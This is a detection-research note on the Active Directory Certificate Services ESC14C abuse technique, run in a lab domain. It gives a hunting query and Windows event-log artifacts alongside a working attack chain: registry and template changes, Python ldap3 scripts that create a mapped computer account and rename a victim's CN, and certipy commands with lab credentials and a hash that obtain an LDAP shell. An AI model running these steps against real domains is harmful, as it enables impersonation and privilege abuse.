# ESC14C (X509IssuerSubject)


# Sources:

[https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82)

# Hunts


## Winlogbeat

### Changer CN  attrivute by not admins

```jsx
winlog.event_id:(5136) 
AND winlog.event_data.AttributeLDAPDisplayName:(CN) 
AND -winlog.event_data.SubjectUserName:(_your_admins_)

```

### 

# Commands

## Short version

```jsx
#Preparation:

#StrongCertificateBindingEnforcement = 0|1
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' -Name 'StrongCertificate
BindingEnforcement' -PropertyType DWORD -Value 1 -Force

#Template ESC14C_req_cn. Require common name in template

#Setup CT_FLAG_NO_SECURITY_EXTENSION on template
certutil -dstemplate ESC14C_req_cn msPKI-Enrollment-Flag +0x80000

#Script creates computer account ESC14C  and writes altSecurityIdentities attribute in X509IssuerSubject format with value "X509:<I>DC=local,DC=essos,CN=ESSOS-CA<S>CN=ESC14C.essos.local":
python esc14c_prep.py

#Attack: 
#Change CN to esc14c.essos.local for khal.drogo using missandei account 
python esc14c_rename_user.py

#Request certificate on behalf of khal.drogo
certipy  req -username "khal.drogo@essos.local" -hashes "739120ebc4dd940310bc4bb5c9d37021" -dc-ip '192.168.56.12' -web  -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'ESC14C_req_cn' -debug

#Authentication as ECS14C$ account with received certificate for khal.drogo.pfx
certipy auth -pfx 'khal.drogo.pfx' -domain "essos.local" -dc-ip 192.168.56.12 -username 'ESC14C' -ldap-shell

#Cleanup (remove ESC14C$ account, rename khal.drogo account back)
python esc14c_cleanup.py  

```

## Script creates computer account ESC14C  and writes altSecurityIdentities attribute in X509IssuerSubject format with value "X509:\<I\>DC=local,DC=essos,CN=ESSOS-CA\<S\>CN=ESC14C.essos.local"

```jsx
import ldap3
from ldap3 import MODIFY_REPLACE, ALL, NTLM

# --- Config ---
server = ldap3.Server('192.168.56.12', get_info=ALL, use_ssl=True)  # LDAPS 
domain = "essos.local"
attacker_username = "essos.local\\daenerys.targaryen"
attacker_password = "BurnThemAll!"

# Container DN 
ou_dn = "CN=Computers,DC=essos,DC=local"

# New computer name
computer_name = "ESC14C"
computer_fqdn = f"{computer_name.lower()}.{domain}"

# Full DN
computer_dn = f"CN={computer_name},{ou_dn}"

#  altSecurityIdentities value
alt_sec_id = f"X509:<I>DC=local,DC=essos,CN=ESSOS-CA<S>CN={computer_fqdn}"

# Password for computer account
new_password = '"Passw0rd!"'.encode('utf-16-le')

# --- Connection ---
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=NTLM,
    auto_bind=True
)

print("[+] Connection successful")

# --- Create computer account ---
success = conn.add(
    dn=computer_dn,
    object_class=['top', 'person', 'organizationalPerson', 'user', 'computer'],
    attributes={
        'cn': computer_name,
        'sAMAccountName': computer_name + "$",
        'userAccountControl': 0x1000,  # WORKSTATION_TRUST_ACCOUNT
        'dNSHostName': computer_fqdn,
        'unicodePwd': new_password
    }
)

if success:
    print(f"[+] Computer {computer_name} was created with Passw0rd!")
else:
    print("[-] Error:", conn.result)
    conn.unbind()
    exit()

# --- Setup altSecurityIdentities ---
success = conn.modify(
    dn=computer_dn,
    changes={
        'altSecurityIdentities': [(MODIFY_REPLACE, [alt_sec_id])]
    }
)

if success:
    print(f"[+]  Attribute altSecurityIdentities  created: {alt_sec_id}")
else:
    print("[-] Error change attribute:", conn.result)

conn.unbind()

```

```jsx

python esc14c_prep.py
```

## Attack. Change CN for khal.drogo to “esc14c.essos.local”

```jsx
import ldap3

server = ldap3.Server('192.168.56.12')
attacker_username = "essos.local\\missandei"
attacker_password = "fr3edom"

# DN of the current object (the one you specified in ADSI)
user_dn = "CN=khal.drogo,CN=Users,DC=essos,DC=local"

# New CN
new_cn = "CN=esc14c.essos.local"

# Connection
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=ldap3.NTLM
)

if not conn.bind():
    print("[-] Connection error:", conn.result)
    exit()

# Rename CN
success = conn.modify_dn(
    dn=user_dn,
    relative_dn=new_cn,
    delete_old_dn=True
)

if success:
    print(f"[+] CN successfully changed to {new_cn}")
else:
    print("[-] Rename error:", conn.result)

conn.unbind()

```

```jsx
python esc14c_rename_user.py
```

## Request certificate as khal.drogo

```jsx

certipy  req -username "khal.drogo@essos.local" -hashes "739120ebc4dd940310bc4bb5c9d37021" -dc-ip '192.168.56.12' -web  -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'ESC14C_req_cn' -debug

```

## Authentication as ECS14C$

```jsx

certipy auth -pfx 'khal.drogo.pfx' -domain "essos.local" -dc-ip 192.168.56.12 -username 'ESC14C' -ldap-shell

```

## Cleanup (delete ESC14C$ account,  rename khal.drogo back)

```jsx
import ldap3
from ldap3 import NTLM

server = ldap3.Server('192.168.56.12')
attacker_username = "essos.local\\daenerys.targaryen"
attacker_password = "BurnThemAll!"

# DN of the current object (the one you specified in ADSI)
user_dn = "CN=esc14c.essos.local,CN=Users,DC=essos,DC=local"

# New CN
new_cn = "CN=khal.drogo"

# Connection
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=ldap3.NTLM
)

if not conn.bind():
    print("[-] Connection error:", conn.result)
    exit()

# Rename CN
success = conn.modify_dn(
    dn=user_dn,
    relative_dn=new_cn,
    delete_old_dn=True
)

if success:
    print(f"[+] CN successfully changed to {new_cn}")
else:
    print("[-] Rename error:", conn.result)

conn.unbind()

# DN of the computer object to be deleted (ECS14C)
computer_dn = "CN=ESC14C,CN=Computers,DC=essos,DC=local"

# --- Connection ---
conn = ldap3.Connection(
    server,
    user=attacker_username,
    password=attacker_password,
    authentication=NTLM
)

```

```jsx

python esc14c_cleanup.py  
```

# Artifacts

## 5136. Change CN of a user

```jsx
A directory service object was modified.
	
Subject:
	Security ID:		ESSOS\missandei
	Account Name:		missandei
	Account Domain:		ESSOS
	Logon ID:		0x10517F

Directory Service:
	Name:	essos.local
	Type:	Active Directory Domain Services
	
Object:
	DN:	CN=khal.drogo,CN=Users,DC=essos,DC=local
	GUID:	CN=esc14c.essos.local,CN=Users,DC=essos,DC=local
	Class:	user
	
Attribute:
	LDAP Display Name:	cn
	Syntax (OID):	2.5.5.12
	Value:	khal.drogo
	
Operation:
	Type:	Value Deleted
	Correlation ID:	{24ed726a-b313-4975-b82f-9d0ed2ae5446}
	Application Correlation ID:	-
```

```jsx
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>5136</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>14081</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T17:11:55.361209000Z" /> 
  <EventRecordID>112506</EventRecordID> 
  <Correlation ActivityID="{C344C1A4-0F99-0000-C2C2-44C3990FDC01}" /> 
  <Execution ProcessID="684" ThreadID="720" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="OpCorrelationID">{24ED726A-B313-4975-B82F-9D0ED2AE5446}</Data> 
  <Data Name="AppCorrelationID">-</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-1330862731-2240521544-517571234-1117</Data> 
  <Data Name="SubjectUserName">missandei</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x10517f</Data> 
  <Data Name="DSName">essos.local</Data> 
  <Data Name="DSType">%%14676</Data> 
  <Data Name="ObjectDN">CN=khal.drogo,CN=Users,DC=essos,DC=local</Data> 
  <Data Name="ObjectGUID">{F4B7A74C-D25B-49DF-8499-F1757491C47E}</Data> 
  <Data Name="ObjectClass">user</Data> 
  <Data Name="AttributeLDAPDisplayName">cn</Data> 
  <Data Name="AttributeSyntaxOID">2.5.5.12</Data> 
  <Data Name="AttributeValue">khal.drogo</Data> 
  <Data Name="OperationType">%%14675</Data> 
  </EventData>
  </Event>
```

## 4886. Certificate Services received a certificate request. (No evidence)

```jsx
Certificate Services received a certificate request.
	
Request ID:	88
Requester:	ESSOS\khal.drogo
Attributes:	
CertificateTemplate:ESC14C_req_cn
ccm:braavos.essos.local
Subject from CSR:	CN=Khal.drogo
Subject Alternative Name from CSR:

Requested Template:	ESC14C_req_cn
RequestOSVersion:	
RequestCSPProvider:	
RequestClientInfo:	
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		DCOM
```

## 4887. Certificate Services approved a certificate request and issued a certificate.  (No evidence)

```jsx
Certificate Services approved a certificate request and issued a certificate.
	
Request ID:	92
Requester:	ESSOS\khal.drogo
Attributes:	
Disposition:	3
SKI:		47 ac d7 ba 60 95 9f 1d 24 32 a0 ed 8a 5a d4 ab c9 eb 29 0e
Subject:	CN=esc14c.essos.local
Subject Alternative Name:

Certificate Template:	ESC14C_req_cn
Serial Number:		640000005c855fdb9464bc086900000000005c
Authentication Service:	NTLM
Authentication Level:	Privacy
DCOMorRPC:		DCOM
```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4887</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T17:33:24.2123482Z" /> 
  <EventRecordID>60300</EventRecordID> 
  <Correlation ActivityID="{4beb5801-0f9c-0001-f259-eb4b9c0fdc01}" /> 
  <Execution ProcessID="752" ThreadID="2520" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
+ <EventData>
  <Data Name="RequestId">92</Data> 
  <Data Name="Requester">ESSOS\khal.drogo</Data> 
  <Data Name="Attributes" /> 
  <Data Name="Disposition">3</Data> 
  <Data Name="SubjectKeyIdentifier">47 ac d7 ba 60 95 9f 1d 24 32 a0 ed 8a 5a d4 ab c9 eb 29 0e</Data> 
  <Data Name="Subject">CN=esc14c.essos.local</Data> 
  <Data Name="SubjectAlternativeName" /> 
  <Data Name="CertificateTemplate">ESC14C_req_cn</Data> 
  <Data Name="SerialNumber">640000005c855fdb9464bc086900000000005c</Data> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">DCOM</Data> 
  </EventData>
  </Event>

```



## 39. The Key Distribution Center (KDC) encountered a user certificate that was valid but could not be mapped to a user in a secure way

```jsx
The Key Distribution Center (KDC) encountered a user certificate that was valid but could not be mapped to a user in a secure way (such as via explicit mapping, key trust mapping, or a SID). Such certificates should either be replaced or mapped directly to the user via explicit mapping. See https://go.microsoft.com/fwlink/?linkid=2189925 to learn more.

  User: ESC14C$
  Certificate Subject: @@@CN=esc14c.essos.local
  Certificate Issuer: ESSOS-CA
  Certificate Serial Number: 6400000058DFA787F8F4318C76000000000058
  Certificate Thumbprint: 0F040128431D1F734698913CC049168CBFCA1771
```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Kerberos-Key-Distribution-Center" Guid="{3FD9DA1A-5A54-46C5-9A26-9BD7C0685056}" EventSourceName="KDC" /> 
  <EventID Qualifiers="32768">39</EventID> 
  <Version>0</Version> 
  <Level>3</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T17:19:35.440947800Z" /> 
  <EventRecordID>8586</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="0" ThreadID="0" /> 
  <Channel>System</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="AccountName">ESC14C$</Data> 
  <Data Name="Subject">@@@CN=esc14c.essos.local</Data> 
  <Data Name="Issuer">ESSOS-CA</Data> 
  <Data Name="SerialNumber">6400000058DFA787F8F4318C76000000000058</Data> 
  <Data Name="Thumbprint">0F040128431D1F734698913CC049168CBFCA1771</Data> 
  <Binary /> 
  </EventData>
  </Event>

```

## 4624. Schannel authentication

```jsx
An account was successfully logged on.

Subject:
	Security ID:		SYSTEM
	Account Name:		MEEREEN$
	Account Domain:		ESSOS
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		ESSOS\ESC14C$
	Account Name:		ESC14C$
	Account Domain:		ESSOS
	Logon ID:		0x16296A
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{4bcf77d6-d2a4-6725-3ba2-8b7002876436}

Process Information:
	Process ID:		0x2ac
	Process Name:		C:\Windows\System32\lsass.exe

Network Information:
	Workstation Name:	MEEREEN
	Source Network Address:	192.168.56.200
	Source Port:		56871

Detailed Authentication Information:
	Logon Process:		Schannel
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
```

```jsx

- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4624</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>12544</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T17:19:35.445216700Z" /> 
  <EventRecordID>112838</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="684" ThreadID="2812" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-18</Data> 
  <Data Name="SubjectUserName">MEEREEN$</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x3e7</Data> 
  <Data Name="TargetUserSid">S-1-5-21-1330862731-2240521544-517571234-1629</Data> 
  <Data Name="TargetUserName">ESC14C$</Data> 
  <Data Name="TargetDomainName">ESSOS</Data> 
  <Data Name="TargetLogonId">0x16296a</Data> 
  <Data Name="LogonType">3</Data> 
  <Data Name="LogonProcessName">Schannel</Data> 
  <Data Name="AuthenticationPackageName">Kerberos</Data> 
  <Data Name="WorkstationName">MEEREEN</Data> 
  <Data Name="LogonGuid">{4BCF77D6-D2A4-6725-3BA2-8B7002876436}</Data> 
  <Data Name="TransmittedServices">-</Data> 
  <Data Name="LmPackageName">-</Data> 
  <Data Name="KeyLength">0</Data> 
  <Data Name="ProcessId">0x2ac</Data> 
  <Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data> 
  <Data Name="IpAddress">192.168.56.200</Data> 
  <Data Name="IpPort">56871</Data> 
  <Data Name="ImpersonationLevel">%%1833</Data> 
  <Data Name="RestrictedAdminMode">-</Data> 
  <Data Name="TargetOutboundUserName">-</Data> 
  <Data Name="TargetOutboundDomainName">-</Data> 
  <Data Name="VirtualAccount">%%1843</Data> 
  <Data Name="TargetLinkedLogonId">0x0</Data> 
  <Data Name="ElevatedToken">%%1842</Data> 
  </EventData>
  </Event>
```

## 39 (Error). If StrongCertificateBindingEnforcement = 2 - attack do not work

```jsx
The Key Distribution Center (KDC) encountered a user certificate that was valid but could not be mapped to a user in a secure way (such as via explicit mapping, key trust mapping, or a SID). Such certificates should either be replaced or mapped directly to the user via explicit mapping. See https://go.microsoft.com/fwlink/?linkid=2189925 to learn more.

  User: ESC14C$
  Certificate Subject: @@@CN=esc14c.essos.local
  Certificate Issuer: ESSOS-CA
  Certificate Serial Number: 640000005B905E0E9E19B1A67D00000000005B
  Certificate Thumbprint: 3083B2C8DE7E6ABD1AB2CE812A29FEBE8F325A5F
```

```jsx
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Kerberos-Key-Distribution-Center" Guid="{3FD9DA1A-5A54-46C5-9A26-9BD7C0685056}" EventSourceName="KDC" /> 
  <EventID Qualifiers="32768">39</EventID> 
  <Version>0</Version> 
  <Level>2</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T17:33:09.864931800Z" /> 
  <EventRecordID>8619</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="0" ThreadID="0" /> 
  <Channel>System</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="AccountName">ESC14C$</Data> 
  <Data Name="Subject">@@@CN=esc14c.essos.local</Data> 
  <Data Name="Issuer">ESSOS-CA</Data> 
  <Data Name="SerialNumber">640000005B905E0E9E19B1A67D00000000005B</Data> 
  <Data Name="Thumbprint">3083B2C8DE7E6ABD1AB2CE812A29FEBE8F325A5F</Data> 
  <Binary /> 
  </EventData>
  </Event>
```